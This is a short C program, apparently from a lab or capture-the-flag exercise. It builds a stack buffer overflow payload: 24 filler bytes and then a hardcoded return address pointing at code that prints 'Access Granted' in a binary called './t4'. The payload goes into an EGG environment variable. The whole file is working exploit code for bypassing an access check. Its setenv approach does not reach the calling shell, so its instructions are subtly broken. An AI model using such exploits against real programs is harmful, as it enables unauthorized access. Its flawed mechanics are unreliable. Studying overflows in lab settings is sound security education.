#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {

    unsigned int target_address = 0x080485a4; // Address of main+133 that prints "Access Granted"
 
    char overflow_str[100];
    int offset = 24; // 16 + 4 + 4
 
    memset(overflow_str, 'A', offset);
    

    overflow_str[offset] = (target_address & 0xFF);
    overflow_str[offset+1] = ((target_address >> 8) & 0xFF);  
    overflow_str[offset+2] = ((target_address >> 16) & 0xFF); 
    overflow_str[offset+3] = ((target_address >> 24) & 0xFF); 
    overflow_str[offset+4] = '\0'; 
    

    if (setenv("EGG", overflow_str, 1) == 0) {
        printf("EGG environment variable set successfully\n");
        printf("Run the vulnerable program with: ./t4 \"$EGG\"\n");
    } else {
        printf("Failed to set EGG environment variable\n");
    }
    
    printf("EGG environment variable set with exploit string\n");
    printf("Run the vulnerable program with: ./t4 $EGG\n");
    
    return 0;
}